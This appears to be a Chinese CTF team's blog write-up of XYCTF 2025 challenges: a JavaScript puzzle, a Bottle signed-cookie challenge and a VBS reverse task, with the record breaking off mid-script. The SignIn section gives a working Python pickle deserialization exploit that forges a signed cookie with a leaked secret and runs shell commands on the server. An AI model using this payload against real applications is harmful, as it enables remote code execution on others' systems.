<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="不知道"><meta name="copyright" content="不知道"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>XYCTF25 不知道 WP | 不知道のblog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="https://img.picui.cn/free/2025/04/13/67fbcc5bc96f6.png"><link rel="mask-icon" href="https://img.picui.cn/free/2025/04/13/67fbcc5bc96f6.png" color="#6200ee"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"example.com","root":"/","title":"不知道的小站","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="战队名：不知道排名：1  Webez_puzzle查看js源码，找到_3KH_函数判断输出flag的地方 if (G &gt; yw4) &#123;       alert(O[s74](J74))     &#125; else &#123;       alert($vfeRha_calc(S74 + G &#x2F; Rw4, Y74, $v5sNVR(vS4)))     &#125;  运行到此处即可">
<meta property="og:type" content="article">
<meta property="og:title" content="XYCTF25 不知道 WP">
<meta property="og:url" content="http://example.com/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/index.html">
<meta property="og:site_name" content="不知道のblog">
<meta property="og:description" content="战队名：不知道排名：1  Webez_puzzle查看js源码，找到_3KH_函数判断输出flag的地方 if (G &gt; yw4) &#123;       alert(O[s74](J74))     &#125; else &#123;       alert($vfeRha_calc(S74 + G &#x2F; Rw4, Y74, $v5sNVR(vS4)))     &#125;  运行到此处即可">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/e859cd5cae823fc6e9ecd736647c7dab-1744626745337-9.png">
<meta property="og:image" content="http://example.com/images/image-1744626745337-3.png">
<meta property="og:image" content="http://example.com/images/image-20250406194123399-1744626745337-4.png">
<meta property="og:image" content="http://example.com/images/image-20250406200423921-1744626745337-5.png">
<meta property="og:image" content="http://example.com/images/1-1744626745337-7.png">
<meta property="og:image" content="http://example.com/images/2-1744626745337-6.png">
<meta property="og:image" content="http://example.com/images/4-1744626745337-8.png">
<meta property="og:image" content="http://example.com/images/5-1744626745337-10.png">
<meta property="og:image" content="http://example.com/images/6-1744626745337-11.png">
<meta property="og:image" content="http://example.com/images/7-1744626745337-12.png">
<meta property="og:image" content="http://example.com/images/8-1744626745338-15.png">
<meta property="og:image" content="http://example.com/images/9-1744626745338-13.png">
<meta property="og:image" content="http://example.com/images/10-1744626745338-14.png">
<meta property="og:image" content="http://example.com/images/11-1744626745338-16.png">
<meta property="og:image" content="http://example.com/images/12-1744626745338-18.png">
<meta property="og:image" content="http://example.com/images/13-1744626745338-17.png">
<meta property="og:image" content="http://example.com/images/14-1744626745338-19.png">
<meta property="og:image" content="http://example.com/images/15-1744626745338-20.png">
<meta property="og:image" content="http://example.com/images/16-1744626745338-21.png">
<meta property="og:image" content="http://example.com/images/17-1744626745338-22.png">
<meta property="og:image" content="http://example.com/images/18-1744626745338-23.png">
<meta property="og:image" content="http://example.com/images/31-1744626745338-24.png">
<meta property="og:image" content="http://example.com/images/19-1744626745338-25.png">
<meta property="og:image" content="http://example.com/images/20-1744626745338-26.png">
<meta property="og:image" content="http://example.com/images/21-1744626745338-27.png">
<meta property="og:image" content="http://example.com/images/22-1744626745338-28.png">
<meta property="og:image" content="http://example.com/images/23-1744626745338-29.png">
<meta property="og:image" content="http://example.com/images/24-1744626745338-30.png">
<meta property="og:image" content="http://example.com/images/25-1744626745338-31.png">
<meta property="og:image" content="http://example.com/images/26-1744626745338-32.png">
<meta property="og:image" content="http://example.com/images/27-1744626745338-33.png">
<meta property="og:image" content="http://example.com/images/28-1744626745338-34.png">
<meta property="og:image" content="http://example.com/images/29-1744626745338-35.png">
<meta property="og:image" content="http://example.com/images/30-1744626745338-36.png">
<meta property="og:image" content="http://example.com/images/32-1744626745338-37.png">
<meta property="og:image" content="http://example.com/images/33-1744626745338-38.png">
<meta property="og:image" content="http://example.com/images/34-1744626745338-39.png">
<meta property="og:image" content="http://example.com/images/35-1744626745338-40.png">
<meta property="og:image" content="http://example.com/images/36-1744626745338-41.png">
<meta property="og:image" content="http://example.com/images/37-1744626745338-42.png">
<meta property="og:image" content="http://example.com/images/38-1744626745338-44.png">
<meta property="og:image" content="http://example.com/images/39-1744626745338-43.png">
<meta property="og:image" content="http://example.com/images/40-1744626745338-45.png">
<meta property="og:image" content="http://example.com/images/41-1744626745338-46.png">
<meta property="og:image" content="http://example.com/images/42-1744626745338-48.png">
<meta property="og:image" content="http://example.com/images/43-1744626745338-47.png">
<meta property="og:image" content="http://example.com/images/44-1744626745338-49.png">
<meta property="og:image" content="http://example.com/images/45-1744626745338-50.png">
<meta property="og:image" content="http://example.com/images/46-1744626745338-51.png">
<meta property="og:image" content="http://example.com/images/47-1744626745338-52.png">
<meta property="og:image" content="http://example.com/images/48-1744626745338-53.png">
<meta property="og:image" content="http://example.com/images/49-1744626745338-54.png">
<meta property="og:image" content="http://example.com/images/50-1744626745338-55.png">
<meta property="og:image" content="http://example.com/images/51-1744626745338-56.png">
<meta property="og:image" content="http://example.com/images/52-1744626745338-57.png">
<meta property="og:image" content="http://example.com/images/53-1744626745339-58.png">
<meta property="og:image" content="http://example.com/images/54-1744626745339-59.png">
<meta property="og:image" content="http://example.com/images/55-1744626745339-60.png">
<meta property="og:image" content="http://example.com/images/56-1744626745339-61.png">
<meta property="og:image" content="http://example.com/images/57-1744626745339-63.png">
<meta property="og:image" content="http://example.com/images/58-1744626745339-62.png">
<meta property="og:image" content="http://example.com/images/59-1744626745339-64.png">
<meta property="og:image" content="http://example.com/images/60-1744626745339-65.png">
<meta property="og:image" content="http://example.com/images/61-1744626745339-66.png">
<meta property="og:image" content="http://example.com/images/cry1-1744626745339-67.png">
<meta property="og:image" content="http://example.com/images/download-1744626745339-68.jpg">
<meta property="og:image" content="http://example.com/images/EASY_1_decpy3-1744626745339-69.png">
<meta property="og:image" content="http://example.com/images/1743836629066-03a76683-7499-468d-85f3-3fb10439a989-1744626745339-70.png">
<meta property="og:image" content="http://example.com/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21-1744626745339-72.png">
<meta property="og:image" content="http://example.com/images/QQ_1743832187198-1744626745339-71.png">
<meta property="og:image" content="http://example.com/images/QQ_1743832241003-1744626745339-73.png">
<meta property="og:image" content="http://example.com/images/QQ_1743832317067-1744626745339-74.png">
<meta property="og:image" content="http://example.com/images/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717-1744626745335-1.png">
<meta property="og:image" content="http://example.com/images/QQ_1743832409731-1744626745339-76.png">
<meta property="og:image" content="http://example.com/images/QQ_1743832453654-1744626745339-75.png">
<meta property="og:image" content="http://example.com/images/QQ_1743832482740-1744626745339-77.png">
<meta property="article:published_time" content="2025-04-07T12:00:45.000Z">
<meta property="article:modified_time" content="2025-04-14T11:02:09.719Z">
<meta property="article:author" content="不知道">
<meta property="article:tag" content="cry">
<meta property="article:tag" content="web">
<meta property="article:tag" content="re">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="misc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/e859cd5cae823fc6e9ecd736647c7dab-1744626745337-9.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="不知道"><img width="96" loading="lazy" src="https://img.picui.cn/free/2025/04/13/67fbcc5bc96f6.png" alt="不知道"></a><div class="site-author-name"><a href="/about/">不知道</a></div><a class="site-name" href="/about/site.html">不知道のblog</a><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">1</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">5</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%98%E9%98%9F%E5%90%8D%EF%BC%9A%E4%B8%8D%E7%9F%A5%E9%81%93"><span class="toc-number">1.</span> <span class="toc-text">战队名：不知道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-puzzle"><span class="toc-number">1.1.1.</span> <span class="toc-text">ez_puzzle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SignIn"><span class="toc-number">1.1.2.</span> <span class="toc-text">SignIn</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WARMUP"><span class="toc-number">1.2.1.</span> <span class="toc-text">WARMUP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezVM"><span class="toc-number">1.2.2.</span> <span class="toc-text">ezVM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Moon"><span class="toc-number">1.2.3.</span> <span class="toc-text">Moon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dragon"><span class="toc-number">1.2.4.</span> <span class="toc-text">Dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Summer"><span class="toc-number">1.2.5.</span> <span class="toc-text">Summer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lake"><span class="toc-number">1.2.6.</span> <span class="toc-text">Lake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzObf"><span class="toc-number">1.2.7.</span> <span class="toc-text">EzObf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CrackMe"><span class="toc-number">1.2.8.</span> <span class="toc-text">CrackMe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Division"><span class="toc-number">1.3.1.</span> <span class="toc-text">Division</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Complex-signin"><span class="toc-number">1.3.2.</span> <span class="toc-text">Complex_signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92"><span class="toc-number">1.3.3.</span> <span class="toc-text">勒索病毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reed"><span class="toc-number">1.3.4.</span> <span class="toc-text">reed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#choice"><span class="toc-number">1.3.5.</span> <span class="toc-text">choice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E5%A4%8D%E5%A4%8D%E5%A4%8D%E6%95%B0"><span class="toc-number">1.3.6.</span> <span class="toc-text">复复复复数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ret2libc%E2%80%99s-Revenge"><span class="toc-number">1.4.1.</span> <span class="toc-text">Ret2libc’s Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E8%8B%A6%E6%89%8B"><span class="toc-number">1.4.2.</span> <span class="toc-text">web苦手</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#girlfriend"><span class="toc-number">1.4.3.</span> <span class="toc-text">girlfriend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%97%A5%E6%96%B9%E8%88%9F%E5%AF%BB%E8%AE%BF%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="toc-number">1.4.4.</span> <span class="toc-text">明日方舟寻访模拟器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-3-0"><span class="toc-number">1.4.5.</span> <span class="toc-text">EZ 3.0</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.5.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="toc-number">1.5.1.</span> <span class="toc-text">签个到吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2"><span class="toc-number">1.5.2.</span> <span class="toc-text">曼波曼波曼波</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MADer%E4%B9%9F%E8%A6%81%E5%BD%93CTFer"><span class="toc-number">1.5.3.</span> <span class="toc-text">MADer也要当CTFer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E9%A3%9E%E7%9A%84%E9%9B%B7%E5%85%8B%E8%90%A8%E6%96%AF"><span class="toc-number">1.5.4.</span> <span class="toc-text">会飞的雷克萨斯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XGCTF"><span class="toc-number">1.5.5.</span> <span class="toc-text">XGCTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Greedymen"><span class="toc-number">1.5.6.</span> <span class="toc-text">Greedymen</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#6200ee;"><link itemprop="mainEntityOfPage" href="http://example.com/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="不知道"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="不知道のblog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">XYCTF25 不知道 WP</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-04-07 20:00:45" itemprop="dateCreated datePublished" datetime="2025-04-07T20:00:45+08:00">2025-04-07</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-04-14 19:02:09" itemprop="dateModified" datetime="2025-04-14T19:02:09+08:00">2025-04-14</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/wp/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">wp</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/cry/" style="--text-color:#4fc08d"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">cry</span></a><a class="tag-item" href="/tags/web/" style="--text-color:#5298d1"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">web</span></a><a class="tag-item" href="/tags/re/" style="--text-color:#0E834D"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">re</span></a><a class="tag-item" href="/tags/pwn/" style="--text-color:#026E00"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pwn</span></a><a class="tag-item" href="/tags/misc/" style="--text-color:#F14E32"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">misc</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="战队名：不知道"><a href="#战队名：不知道" class="headerlink" title="战队名：不知道"></a>战队名：不知道</h1><p><strong>排名</strong>：<strong>1</strong></p>
<p><img src="/images/e859cd5cae823fc6e9ecd736647c7dab-1744626745337-9.png" loading="lazy"></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h3><p>查看js源码，找到_3KH_函数判断输出flag的地方</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token punctuation">(</span>G <span class="token operator">></span> yw4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      alert<span class="token punctuation">(</span>O<span class="token punctuation">[</span>s74<span class="token punctuation">]</span><span class="token punctuation">(</span>J74<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      alert<span class="token punctuation">(</span>$vfeRha_calc<span class="token punctuation">(</span>S74 <span class="token operator">+</span> G <span class="token operator">/</span> Rw4<span class="token punctuation">,</span> Y74<span class="token punctuation">,</span> $v5sNVR<span class="token punctuation">(</span>vS4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span></code></pre>

<p>运行到此处即可</p>
<p><img src="/images/image-1744626745337-3.png" loading="lazy"></p>
<h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p>访问&#x2F;secret 获得cookie </p>
<p>疑似Bottle 框架的 signed cookie</p>
<p>signed cookie 构造</p>
<p><code>!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=</code>是 base 64 编码的   HMAC - SHA 1 签名</p>
<p><code>gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu</code>是 base64 编码的 Python 数据，反序列化后应该是</p>
<p>也就是说第二端可以通过pickle 序列化攻击实现 rce</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bottle <span class="token keyword">import</span> SimpleCookie
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> hmac
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> pickle

<span class="token keyword">def</span> <span class="token function">make_signed_cookie</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    digest <span class="token operator">=</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pickled<span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cookie <span class="token operator">=</span> <span class="token string">'!'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cookie

<span class="token comment"># 假设你已经拿到 secret 内容：</span>
secret <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># ← 替换成实际值</span>
data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">&#125;</span>
signed_cookie <span class="token operator">=</span> make_signed_cookie<span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"伪造的 Cookie 值："</span><span class="token punctuation">,</span> signed_cookie<span class="token punctuation">)</span></code></pre>

<p>通过&#x2F;download 读取 签名</p>
<p><img src="/images/image-20250406194123399-1744626745337-4.png" loading="lazy"></p>
<pre class="language-vbnet" data-language="vbnet"><code class="language-vbnet">Hell0_H@cker_Y0u_A3r_Sm@r7</code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bottle <span class="token keyword">import</span> SimpleCookie
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> hmac
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> pickle

<span class="token keyword">def</span> <span class="token function">make_signed_cookie</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    digest <span class="token operator">=</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pickled<span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cookie <span class="token operator">=</span> <span class="token string">'!'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cookie

secret <span class="token operator">=</span> <span class="token string">"Hell0_H@cker_Y0u_A3r_Sm@r7"</span>  
<span class="token keyword">class</span> <span class="token class-name">Data</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
         
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag*>/test.txt').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> Data<span class="token punctuation">(</span><span class="token punctuation">)</span>
encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span>
signed_cookie <span class="token operator">=</span> make_signed_cookie<span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"伪造的 Cookie 值："</span><span class="token punctuation">,</span> signed_cookie<span class="token punctuation">)</span></code></pre>

<p>伪造cookie成功后再通过download 路由实现任意文件读取</p>
<p><img src="/images/image-20250406200423921-1744626745337-5.png" loading="lazy"></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h3><p>网上抄的VBS解密代码</p>
<pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">Function Defuscator(vbs)
    Dim t
    t &#x3D; InStr(1, vbs, &quot;Execute&quot;, 1)
    t &#x3D; Mid(vbs, t + Len(&quot;Execute&quot;))
    t &#x3D; Eval(t)
    Defuscator &#x3D; t
End Function

Dim fso, i, outFile
Const ForReading &#x3D; 1, ForWriting &#x3D; 2
Set fso &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)

    &#39; 创建或打开一个文件用于写入输出
    Set outFile &#x3D; fso.OpenTextFile(&quot;output.txt&quot;, ForWriting, True)

        For i &#x3D; 0 To WScript.Arguments.Count - 1
        Dim FileName
        FileName &#x3D; WScript.Arguments(i)
        Dim MyFile
        Set MyFile &#x3D; fso.OpenTextFile(FileName, ForReading)
            Dim vbs
            vbs &#x3D; MyFile.ReadAll
            outFile.WriteLine Defuscator(vbs)
            MyFile.Close
        Next

        outFile.Close
        Set fso &#x3D; Nothing</code></pre>

<p>output.txt:</p>
<pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">MsgBox &quot;Dear CTFER. Have fun in XYCTF 2025!&quot;
flag &#x3D; InputBox(&quot;Enter the FLAG:&quot;, &quot;XYCTF&quot;)
wefbuwiue &#x3D; &quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot; &#39; 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級
qwfe &#x3D; &quot;rc4key&quot;

&#39; 淇鍚庣殑RC4鍔犲瘑鍑芥暟
Function RunRC(sMessage, strKey)
    Dim kLen, i, j, temp, pos, outHex
    Dim s(255), k(255)
    
    &#39; 鍒濆鍖栧瘑閽?
    kLen &#x3D; Len(strKey)
    For i &#x3D; 0 To 255
        s(i) &#x3D; i
